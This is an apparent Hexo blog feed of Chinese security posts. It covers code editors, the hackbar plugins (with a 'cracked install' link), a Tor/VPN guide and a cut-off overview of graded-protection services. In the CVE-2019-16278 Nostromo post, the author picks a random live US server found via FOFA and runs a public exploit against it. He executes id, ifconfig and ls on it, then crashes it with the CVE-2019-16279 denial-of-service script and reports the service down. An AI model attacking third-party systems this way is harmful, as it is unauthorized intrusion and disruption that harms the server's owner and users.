sublime</h2><p>神级代码编辑器，好用到爆，深受众多程序员喜爱。</p><p>下载传送门：<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">传送门</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094507.png" class="lozad"></p><h2 id="2-2-vim"><a href="#2-2-vim" class="headerlink" title="2.2 vim"></a>2.2 vim</h2><p>据说是最好用的编辑器，等你熟悉了语法，功能后，那手感真是不一样。</p><p>下载传送门：<a href="https://www.vim.org/download.php" target="_blank" rel="noopener">传送门</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094140.png" class="lozad"></p><h2 id="2-3-vscode"><a href="#2-3-vscode" class="headerlink" title="2.3 vscode"></a>2.3 vscode</h2><p>纵享丝滑，用了你就卸载不掉的那种。</p><p>下载传送门：<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">传送门</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094322.png" class="lozad"></p><h2 id="2-4-Typora"><a href="#2-4-Typora" class="headerlink" title="2.4 Typora"></a>2.4 Typora</h2><p>Markdown语法的编辑器，本人现在写文章用的编辑器，好用之处更于他人说。</p><p>下载传送门：<a href="https://www.typora.io/" target="_blank" rel="noopener">https://www.typora.io/</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094731.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 安全资讯 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>火狐插件-hackbar与MaxHackbar</title>
      <link href="/2019/10/29/%E7%81%AB%E7%8B%90%E6%8F%92%E4%BB%B6-hackbar%E4%B8%8EMaxHackbar/"/>
      <url>/2019/10/29/%E7%81%AB%E7%8B%90%E6%8F%92%E4%BB%B6-hackbar%E4%B8%8EMaxHackbar/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>hackbar，一个渗透测试人员必备的浏览器插件神器，这里不做赘述，但是随着hackbar收费以来，收到安全圈内广大朋友的吐槽，毕竟免费真香~ v~。</p><p>MaxHackbar，一个与hackbar类似的插件，个人觉得好像比hackbar还强大一点。</p><a id="more"></a><h1 id="0x01-hackbar"><a href="#0x01-hackbar" class="headerlink" title="0x01 hackbar"></a>0x01 hackbar</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>渗透测试使用的神器，可以方便手工注入、XSS、编码等测试。</p><h2 id="1-2-破解安装"><a href="#1-2-破解安装" class="headerlink" title="1.2 破解安装"></a>1.2 破解安装</h2><p>下载地址：<a href="https://github.com/1stPeak/hackbar2.1.3-master" target="_blank" rel="noopener">hackbar2.1.3传送门</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161952.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029162009.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029162025.png" class="lozad"></p><h2 id="1-3-使用"><a href="#1-3-使用" class="headerlink" title="1.3 使用"></a>1.3 使用</h2><p>按F12</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029162201.png" class="lozad"></p><h1 id="0x02-Maxhackbar"><a href="#0x02-Maxhackbar" class="headerlink" title="0x02 Maxhackbar"></a>0x02 Maxhackbar</h1><h2 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h2><p>应为hackbar的收费，所以有大佬做出来与hackbar功能基本一样的插件。真心强大，菜鸡的我献上膜拜的眼神。</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/4823ed041c7a454a" class="lozad"></p><h2 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h2><p>安装很简单，只要在火狐的插件库中去搜索安装就行了，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161313.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161338.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161356.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161434.png" class="lozad"></p><h2 id="2-3-使用"><a href="#2-3-使用" class="headerlink" title="2.3 使用"></a>2.3 使用</h2><p>按F12</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161512.png" class="lozad"></p><p>详细使用，后期介绍。</p><h1 id="0x03-hackbar-compare-with-Maxhackbar"><a href="#0x03-hackbar-compare-with-Maxhackbar" class="headerlink" title="0x03 hackbar compare with Maxhackbar"></a>0x03 hackbar compare with Maxhackbar</h1><p>emmmm，尽情期待。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 火狐插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-16278 RCE复现</title>
      <link href="/2019/10/29/CVE-2019-16278-RCE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/10/29/CVE-2019-16278-RCE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在网上看到关于CVE-2019-16278的漏洞复现文章，然后自己也照个找个复现玩玩，这里来记录一下.</p><a id="more"></a><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Nostromo web server(nhttpd)是一个开源的web服务器，在Unix系统非常流行。</p><p>漏洞原因是web服务在对URL进行检查是在URL被解码前，攻击者可以将/转换为%2f就可绕过检查，之前出现过类似漏洞CVE-2011-0751.</p><blockquote><p>影响版本：Nostromo version &lt;= 1.9.6</p></blockquote><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="2-1-复现脚本"><a href="#2-1-复现脚本" class="headerlink" title="2.1 复现脚本"></a>2.1 复现脚本</h2><blockquote><p><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150339.png" class="lozad"></p><h2 id="2-2-随机靶机选择"><a href="#2-2-随机靶机选择" class="headerlink" title="2.2 随机靶机选择"></a>2.2 随机靶机选择</h2><p>因为在网站看到别人自己搭环境没有成功，所以，嘿嘿，我就偷个懒，直接使用fofa在互联网上搜一个搞搞。</p><p>FOFA关键词：<strong>“Nostromo”**</strong>，随便用一个美国的试试**</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150451.png" class="lozad"></p><p>先将exp克隆到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://git.sp0re.sh/sp0re/Nhttpd-exploits.git</span><br><span class="line">cd Nhttpd-exploits</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150529.png" class="lozad"></p><h2 id="2-3-验证RCE漏洞"><a href="#2-3-验证RCE漏洞" class="headerlink" title="2.3 验证RCE漏洞"></a>2.3 验证RCE漏洞</h2><p>使用id命令查看用户权限</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150541.png" class="lozad"></p><p>使用ifconfig命令查看ip地址等信息。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150551.png" class="lozad"></p><p>使用ls命令查看目录文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150606.png" class="lozad"></p><h2 id="2-4-验证DOS漏洞"><a href="#2-4-验证DOS漏洞" class="headerlink" title="2.4 验证DOS漏洞"></a>2.4 验证DOS漏洞</h2><p>先使用curl命令查看目标服务是否正常</p><blockquote><p>curl <a href="http://71.xxx.xxx.231:8080" target="_blank" rel="noopener">http://71.xxx.xxx.231:8080</a></p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150611.png" class="lozad"></p><p>使用脚本宕掉服务</p><blockquote><p>/CVE-2019-16279.sh 71.xxx.xxx.231 8080</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150748.png" class="lozad"></p><p>目标服务已经挂了</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150759.png" class="lozad"></p><h1 id="0x03-加固修复"><a href="#0x03-加固修复" class="headerlink" title="0x03 加固修复"></a>0x03 加固修复</h1><p>   官方目前并没有给出修复措施</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/4860632969d16d17" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></p><p><a href="https://www.cnblogs.com/mark-zh/p/11728168.html" target="_blank" rel="noopener">https://www.cnblogs.com/mark-zh/p/11728168.html</a></p><p><a href="https://www.daoblogs.org/post-39.html" target="_blank" rel="noopener">https://www.daoblogs.org/post-39.html</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年Tor浏览器终极指南</title>
      <link href="/2019/10/25/2019%E5%B9%B4Tor%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/"/>
      <url>/2019/10/25/2019%E5%B9%B4Tor%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>如果你想更了解Tor浏览器，那表示你已经知道<strong>在线隐私和匿名</strong>的重要性。因为Tor浏览器是帮助你保持在线安全的绝佳工具。但是关于它的优缺点，特别是<strong>关于它与VPN之间的关系</strong>，有很多人还一知半解。</p><a id="more"></a><h1 id="0x01-Tor浏览器是什么？"><a href="#0x01-Tor浏览器是什么？" class="headerlink" title="0x01 Tor浏览器是什么？"></a>0x01 Tor浏览器是什么？</h1><p>Tor浏览器在很多方面<strong>与普通的网络浏览器类似</strong>。易用性和Google Chrome或Microsoft Edge差不多。其不同之处在于Tor浏览器通过Tor网络将你连接到互联网。</p><p><strong>Tor是可以帮助你在线保持匿名的免费开源软件</strong>。当你使用Tor浏览器浏览互联网时，你的流量会在到达最终目的地之前通过服务器网络随机定向，以<strong>保护你的位置和身份安全</strong>。</p><p>“Tor”是“洋葱路由器（The Onion Router）”的缩写，反映Tor通过将数据<strong>包装在多个加密层</strong>中（如洋葱一般）来保护其数据的方式。</p><h1 id="0x02-Tor浏览器是VPN吗？"><a href="#0x02-Tor浏览器是VPN吗？" class="headerlink" title="0x02 Tor浏览器是VPN吗？"></a>0x02 Tor浏览器是VPN吗？</h1><p>Tor浏览器和VPN都是用来保护在线隐私的工具。然而，<strong>它们是两种不同的东西</strong>。其以截然不同的技术并<strong>以不同的方式来保护你</strong>的安全。</p><p>VPN将所有数据通过端到端加密以对其进行保护，再通过安全通道将其定向到远程服务器，而该服务器会再将你连接到你要访问的网站。</p><p>我们将在下面解释Tor浏览器如何以不同的方式保护你的隐私。</p><p>重要的是Tor浏览器与VPN不同，但<strong>你可以将这两个工具结合使用，以确保你的安全和隐私滴水不漏</strong>。</p><h1 id="0x03-Tor浏览器如何运作？"><a href="#0x03-Tor浏览器如何运作？" class="headerlink" title="0x03 Tor浏览器如何运作？"></a>0x03 Tor浏览器如何运作？</h1><p>尽管Tor浏览器的后台系统很复杂，但却非常容易使用。你只需<strong>下载并安装Tor浏览器</strong>，就可像使用任何其他浏览器一样<strong>连接到互联网</strong>。</p><p>Tor使用由美国海军开发来保护政府情报通信的独特系统。</p><p>你的数据将在进入Tor网络之前，被捆绑到加密数据包层中。然后<strong>通过一系列由志愿者操作的服务器（称为节点或中继）进行路由</strong>。</p><p>数据每通过一个中继，就会移除一层加密，以显示下一个中继的位置。<strong>当数据到达最终中继（称为“出口节点”）时，最后一层加密将被删除</strong>，而你的数据则会被发送到其最终目标地。</p><p>每个中继仅解密有助于了解前一个和下一个中继位置的数据。由于每个路径都是随机生成的，并且没有保留任何一个中继的记录，因此<strong>任何人都难以通过Tor的复杂网络追溯你的足迹</strong>。</p><h1 id="0x04-Tor浏览器安全吗？"><a href="#0x04-Tor浏览器安全吗？" class="headerlink" title="0x04 Tor浏览器安全吗？"></a>0x04 Tor浏览器安全吗？</h1><p>Tor浏览器可非常有效地<strong>隐藏你的位置并防止你的流量被跟踪</strong>，使任何人都难以通过Tor的网络追溯你的在线活动。</p><p>然而，<strong>Tor浏览器并不是没有漏洞</strong>。该系统有些缺点。由于Tor网络中的每个服务器都是<strong>由志愿者操作</strong>，因此你永远不知道数据传输的中继是由谁所有。</p><p>通常，因为<strong>每个中继 – 除了出口节点以外 – 只能获悉前一个和下一个中继的位置，</strong>因此这不成问题。</p><p>出口节点会删除数据的最后一层加密。你的原始位置或IP地址不会被看见，但如果你访问不安全的HTTP网站，则<strong>出口节点可能会借此监视你的活动</strong>。</p><p>此外，Tor浏览器<strong>也与其他浏览器一样容易受到类似的攻击</strong>。如果你想保持匿名，则最好关闭浏览器的插件和脚本，因为其可能会泄露你的IP地址等信息。</p><h1 id="0x05-Tor浏览器有哪些缺点？"><a href="#0x05-Tor浏览器有哪些缺点？" class="headerlink" title="0x05 Tor浏览器有哪些缺点？"></a>0x05 Tor浏览器有哪些缺点？</h1><p>使用Tor浏览器的最大缺点是速度。由于你的数据必须在到达最终目的地之前经过多个中继，因此你的<strong>浏览速度可能非常慢</strong>。</p><p>Tor浏览器不是流媒体和下载的最佳选择，而其创建者也<strong>强烈反对种子下载</strong>。使用Tor下载不仅慢，且下载流量没有受到保护，更可能因此暴露你的IP地址。</p><p>如果你正在寻找<strong>流媒体或下载的方式，则VPN将为你提供更好的保护</strong>。</p><p>使用Tor浏览器的另一个缺点是它可能<strong>让你的在线活动受到关注</strong>。你的互联网服务提供商（ISP）无法看到你正在进行的活动，但他们知到你正在使用Tor，进而对你正在从事的活动产生怀疑。</p><p>即使你只使用Tor浏览器来合法浏览互联网，连接Tor也<strong>可能使你成为政府监控的目标</strong>。像美国国家安全局和联邦调查局这样的美国政府机构都积极试图跟踪Tor用户的在线活动。</p><h1 id="0x06-Tor搭配VPN"><a href="#0x06-Tor搭配VPN" class="headerlink" title="0x06 Tor搭配VPN"></a>0x06 Tor搭配VPN</h1><p>Tor浏览器相当实用，但它不能提供VPN所提供的安全防护。幸运的是，你不必在两者之间做选择。<strong>你可以将Tor浏览器和VPN结合使用，以结合其功能并获得最佳隐私</strong>。</p><p>将Tor浏览器和VPN结合的方式<strong>主要有两种</strong>。我们将讲解这两种方法的流程并解释每种方法的优缺点。</p><h1 id="0x07-Tor-over-VPN"><a href="#0x07-Tor-over-VPN" class="headerlink" title="0x07 Tor over VPN"></a>0x07 Tor over VPN</h1><p>若要使用此方法，首先你必须连接到VPN，然后进入Tor网络。此方法有一些优点，其中包含易用性，因为你<strong>只需连接到VPN再打开Tor浏览器</strong>即可。</p><p>在大多数情况下，此配置可为你提供足够的安全性和隐私以保护你的安全。</p><p><strong>一些VPN通过提供内置的Tor服务使此过程变得更加容易</strong>，其中例如<a href="https://zh.vpnmentor.com/reviews/nordvpn/" target="_blank" rel="noopener">NordVPN</a>的Onion over VPN服务，即可让你在没有Tor浏览器的情况下连接到Tor。</p><p>NordVPN通过其安全的VPN服务器来路由你的流量，然后直接将流量路由至Tor网络。<strong>NordVPN服务可以保护你设备上的所有流量，而不仅仅是你的浏览器活动</strong>。</p><p>Tor over VPN的另一个好处是，你的所有数据在进入Tor网络之前，都将由VPN进行安全加密。因此，<strong>Tor的志愿者操作服务器将无法获取你真实的IP地址</strong>。</p><p>由于VPN会隐藏你的在线活动，因此<strong>你的ISP也将无法检测到你的Tor连接</strong>。</p><p>因为你的VPN提供商无法看到你在Tor网络中从事的活动，你可从而获得一层隐私。另一方面，如果你的VPN提供商记录你的活动日志，则<strong>Tor over VPN无法隐藏你的真实IP地址或你正在使用Tor的事实</strong>。</p><p>此方法的另一个缺点是它<strong>不能保护你免受恶意出口节点的攻击</strong>，因为你的流量在到达最终目的地时没有受到加密。</p><h1 id="0x08-VPN-over-Tor"><a href="#0x08-VPN-over-Tor" class="headerlink" title="0x08 VPN over Tor"></a>0x08 VPN over Tor</h1><p>使用此方法时，你首先必须连接到Tor网络，然后再连接到VPN。此过程比Tor over VPN<strong>更复杂</strong>，因为在大多数情况下，你必须<strong>手动配置VPN</strong>才能使用Tor。</p><p>VPN over Tor最大的好处是它可以<strong>保护你免受Tor出口节点的攻击</strong>。你的流量不会直接从出口节点转到最终目的地，而是从出口节点路由到安全的VPN服务器。</p><p>此配置因此<strong>非常适合用来传递敏感信息</strong>。</p><p>此方法的坏处是，<strong>你的ISP以及政府机构</strong>虽不能看见你的在线活动<strong>，却能查知你的Tor连接</strong>。</p><p>此方法还可以<strong>避免VPN提供商记录你的真实IP地址</strong>。然而，若你选择采用透明的无日志政策的VPN，便不用担心这个问题。</p><h1 id="0x09-结论"><a href="#0x09-结论" class="headerlink" title="0x09 结论"></a>0x09 结论</h1><p>尽管Tor浏览器有其缺陷，但仍可有效保护你的在线隐私。<strong>将Tor的匿名性与VPN的安全性和安全性相结合</strong>，更可以让你获得两全其美的服务。</p><p>如果你打算使用Tor浏览器，我们强烈建议你搭配使用VPN。</p><p><strong>VPN</strong>可在不显着降低Tor浏览器速度的前提下<strong>提供出色的安全性和匿名性</strong>。</p><p>如果你正在寻找值得信赖VPN来保护你的在线隐私，请查看我们的最佳<a href="https://zh.vpnmentor.com/blog/最優惠vpn及折扣代碼/" target="_blank" rel="noopener">VPN优惠和优惠券代码</a>列表。</p><p>洋葱路由使用教程：<a href="https://www.5xiaobo.com/?id=308" target="_blank" rel="noopener">https://www.5xiaobo.com/?id=308</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tor浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等保服务内容及报价</title>
      <link href="/2019/10/24/%E7%AD%89%E4%BF%9D%E6%9C%8D%E5%8A%A1%E5%86%85%E5%AE%B9%E5%8F%8A%E6%8A%A5%E4%BB%B7/"/>
      <url>/2019/10/24/%E7%AD%89%E4%BF%9D%E6%9C%8D%E5%8A%A1%E5%86%85%E5%AE%B9%E5%8F%8A%E6%8A%A5%E4%BB%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着等保2.0的到来，再一次掀起了网络安全的热潮，为了让大家更好的理解等级保护，决定整理此文，内容来自互联网搜集。</p><a id="more"></a><h1 id="0x01-信息安全等级保护服务流程及内容"><a href="#0x01-信息安全等级保护服务流程及内容" class="headerlink" title="0x01 信息安全等级保护服务流程及内容"></a>0x01 信息安全等级保护服务流程及内容</h1><p>信息安全等级保护服务分为定级<strong>备案咨询</strong>、<strong>安全建设规划</strong>、<strong>安全等级现状测评</strong>、<strong>信息系统安全整改咨询</strong>和<strong>信息安全等级测评</strong>五个阶段，各阶段工作内容如下：</p><ol><li><p>定级备案咨询阶段：通过定级对象分析、定级要素分析，初步确定系统保护等级，协助召开定级专家咨询会议，确定系统保护等级，协助撰写定级报告、协助联络公安机关，完成定级备案工作。</p></li><li><p>安全建设规划阶段：协助建设单位按照同步规划、同步建设、同步运行的原则，做好项目建设的安全规划。</p></li><li><p>安全等级现状测评阶段：详实调研业务系统，了解系统边界、功能、服务范围、涉及部门、重要程度，全面进行差距分析和脆弱性评估；找出不足之处和安全漏洞，为等级保护体系设计提供客观依据；将根据之前的项目成果，制定合理安全管理措施和技术措施，形成等级化的信息安全保障体系。</p></li><li><p>信息系统安全整改咨询阶段：依据脆弱性评估结果，弥补技术层面的安全漏洞；建立健全信息安全管理制度；根据前期信息安全保障体系设计方案，指导系统运维方落实相关安全保障措施。</p></li><li><p>信息安全等级测评阶段：实施等级测评，以满足国家信息安全监管的相关政策要求。</p></li></ol><p>等保服务在合同签订后1个月内完成项目的系统定级、安全建设规划。在系统建设完成后2周内完成安全评估差距分析、整改建议等工作。在系统整改完成后2周内完成信息安全等级测评工作，出具等保测评报告。</p><h1 id="0x02-定级备案咨询"><a href="#0x02-定级备案咨询" class="headerlink" title="0x02 定级备案咨询"></a>0x02 定级备案咨询</h1><h2 id="2-1-工作内容"><a href="#2-1-工作内容" class="headerlink" title="2.1 工作内容"></a>2.1 工作内容</h2><p>（1）系统梳理</p><p>网络拓扑调查：通过对系统网络拓扑结构的调查，确定各个网络安全域，分析网络拓扑结构安全。</p><p>资产信息调查：通过对资产信息的调查，确定系统中重要资产，比如服务器、核心交换机、边界防火墙、IDS等。</p><p>服务信息调查：通过对服务信息的调查，确定系统服务对象。</p><p>系统边界调查：通过对系统边界的调查，确定各子系统边界情况。</p><p>（2）定级对象分析</p><p>业务类型分析：通过对业务类型的分析，确定各系统的重要性。</p><p>管理机构分析：通对管理机构的分析，确定安全管理机构设置的合理性。</p><p>（3）定级要素分析</p><p>业务信息分析：通过以上调查与分析，明确业务信息（系统数据）被破坏后受侵害的客体（公民、法人和其他组织的合法权益，社会秩序、公共利益，国家安全）和侵害程度。</p><p>系统服务分析：通过以上调查与分析，明确系统被破坏或者中断服务后受侵害的客体（公民、法人和其他组织的合法权益，社会秩序、公共利益，国家安全）和侵害程度。</p><p>综合分析：通过对业务信息分析与系统服务分析，分别确定其安全等级确定等级：取业务信息安全等级与系统服务安全等级中最高的为整个系统安全等级。</p><p>（4）撰写定级报告</p><p>撰写定级报告：通过以上调查与分析，撰写系统定级报告，包括系统描述、业务信息安全保护等级的确定、系统服务安全保护等级的确定、整个系统安全保护等级的确定等。</p><p>（5）协助定级备案</p><p>协助填写备案表：协助业主完成系统安全等级保护备案表的填写。</p><p>协助评审审批：协助业主组织召开系统定级结果评审会，协助业主完成整个定级审批过程。</p><h2 id="2-2-交付成果"><a href="#2-2-交付成果" class="headerlink" title="2.2 交付成果"></a>2.2 交付成果</h2><p>信息系统安全等级保护定级报告</p><p>信息系统定级备案表</p><h1 id="0x03-安全建设规划"><a href="#0x03-安全建设规划" class="headerlink" title="0x03  安全建设规划"></a>0x03  安全建设规划</h1><h2 id="3-1-工作内容"><a href="#3-1-工作内容" class="headerlink" title="3.1 工作内容"></a>3.1 工作内容</h2><p>根据等级化安全保障体系的设计思路，等级保护的安全建设规划包括以下内容：</p><ol><li><p>安全域设计：根据系统定级情况，通过分析系统业务流程、功能模块，根据安全域划分原则设计系统安全域架构。通过安全域设计将系统分解为多个层次，为下一步安全保障体系框架设计提供基础框架。</p></li><li><p>确定安全域安全要求：参照国家相关等级保护安全要求，设计不同安全域的安全要求。通过安全域适用安全等级选择方法确定系统各区域等级，明确各安全域所需采用的安全指标。</p></li><li><p>安全保障体系方案设计：根据安全域框架，设计系统各个层次的安全保障体系框架以及具体方案。包括：各层次的安全保障体系框架形成系统整体的安全保障体系框架；物理安全、网络安全、服务器安全等安全技术设计，安全管理制度规划与设计。</p></li></ol><p>通过如上内容的规划，系统可以形成整体的等级化的安全保障体系，同时根据安全术建设和安全管理建设，保障系统整体的安全。</p><h2 id="3-2-交付成果"><a href="#3-2-交付成果" class="headerlink" title="3.2 交付成果"></a>3.2 交付成果</h2><p>信息系统安全等级保护建设规划方案</p><h1 id="0x04-安全等级现状测评"><a href="#0x04-安全等级现状测评" class="headerlink" title="0x04 安全等级现状测评"></a>0x04 安全等级现状测评</h1><p>为确保信息系统的安全保护措施符合相应安全等级的基本安全要求，需要实施安全等级现状测评，以提出合理、有效的安全整改建议，为信息系统制定信息安全规划和决策提供依据。</p><p>测评机构将指导系统运维方开展安全评估工作，简要了解系统现有安全保障措施与国家信息安全等级保护等级标准要求之间的差距，制定信息安全规划方案；同时检查系统在技术层面存在的脆弱性漏洞，为后续安全加固工作奠定基础。</p><h2 id="4-1-等级保护差距分析"><a href="#4-1-等级保护差距分析" class="headerlink" title="4.1 等级保护差距分析"></a>4.1 等级保护差距分析</h2><p>按照等级保护实施要求，信息系统应该具备相应等级的安全防护能力，部署相应的安全设备，制定相应的安全管理机构、制度、岗位等。</p><p>差距分析就是依据等级保护技术标准和管理规范，比较分析信息系统安全防护能力与等级要求之间的差距。为等级化体系设计提供依据。</p><h3 id="4-1-1-工作内容"><a href="#4-1-1-工作内容" class="headerlink" title="4.1.1 工作内容"></a>4.1.1 工作内容</h3><p>差距分析将从技术上的物理安全、网络安全、主机系统安全、应用安全和数据安全五个层面和管理上的安全管理机构、安全管理制度、人员安全管理、系统建设管理和系统运维管理等五个方面分别进行。具体内容为：</p><p>1、技术差距检测：</p><p>(1)物理安全：针对信息系统所处的物理环境即机房、线路、基础支撑设施等进行标准符合性识别。主要包含：物理位置选择、物理访问控制、防盗窃和防破</p><p>坏、防雷击、防火、防水和防潮、防静电、温湿度控制、电力供应、电磁防护等方面。</p><p>(2)网络安全：对评估工作范围内的网络与安全设备、网络架构进行网络安全符合性调查。主要包含：结构安全与网段划分、网络访问控制、网络安全审计、边界完整性检查、网络入侵防范、恶意代码防范、网络设备防护等方面。</p><p>(3)主机安全：评估信息系统的主机系统安全保障情况。主要包含：身份鉴别、访问控制、安全审计、系统保护、入侵防护、恶意代码防护、资源控制等方面。</p><p>(4)应用安全：对信息系统进行应用安全符合性调查。主要包含：身份鉴别、访问控制、安全审计、通信完整性、通信保密性、抗抵赖、软件容错、资源控制等方面。</p><p>(5)数据安全：评估信息系统的数据安全保障情况。主要检查系统的数据在采集、传输、处理和存储过程中的安全。</p><p>2、管理差距检测：</p><p>(1)安全管理制度:评估安全管理制度的制定、发布、评审和修订等情况。主要涉及安全主管人员、安全管理人员、各类其它人员、各类管理制度、各类操作规程文件等对象。</p><p>(2)安全管理机构:评估安全管理机构的组成情况和机构工作组织情况。主要涉及安全主管人员、安全管理人员、相关的文件资料和工作记录等对象。</p><p>(3)人员安全管理：评估机构人员安全控制方面的情况。主要涉及安全主管人员、人事管理人员、相关管理制度、相关工作记录等对象。</p><p>(4)系统建设管理：评估系统建设管理过程中的安全控制情况。主要涉及安全主管人员、系统建设负责人、各类管理制度、操作规程文件、执行过程记录等对象。</p><p>(5)系统运维管理：评估系统运维管理过程中的安全控制情况。主要涉及安全主管人员、安全管理人员、各类运维人员、各类管理制度、操作规程文件、执行过程记录等对象。</p><p>3、等级保护差距分析：</p><p>基于技术、管理层面的标准合规性检测结果，根据国家等级保护标准，结合行业规范，针对标准的每项具体要求，从微观角度展开，深入分析信息系统与相应等级要求之间的差距，并从宏观角度对计算环境、区域边界和通信网络等方面对单元检测的结果进行验证、分析和整体评价，确认信息系统的整体安全防护能力有无缺失，是否能够对抗相应等级的安全威胁，为安全规划设计提供依据。</p><h3 id="4-1-2-交付成果"><a href="#4-1-2-交付成果" class="headerlink" title="4.1.2 交付成果"></a>4.1.2 交付成果</h3><p>信息系统等级保护差距分析报告</p><h2 id="4-2-脆弱性检测"><a href="#4-2-脆弱性检测" class="headerlink" title="4.2 脆弱性检测"></a>4.2 脆弱性检测</h2><p>脆弱性（弱点）是指可能为许多目的所利用的系统某些方面，包括系统弱点、安全漏洞和实现的缺陷等。为识别和分析信息系统所存在的脆弱性，确认需要实施安全加固与调优的事项，将首先进行脆弱性检测工作，从网络层、主机层和应用层三个方面进行检测，本次脆弱性检测的主要内容是漏洞扫描和系统配置检查。</p><h3 id="4-2-1-工作内容"><a href="#4-2-1-工作内容" class="headerlink" title="4.2.1 工作内容"></a>4.2.1 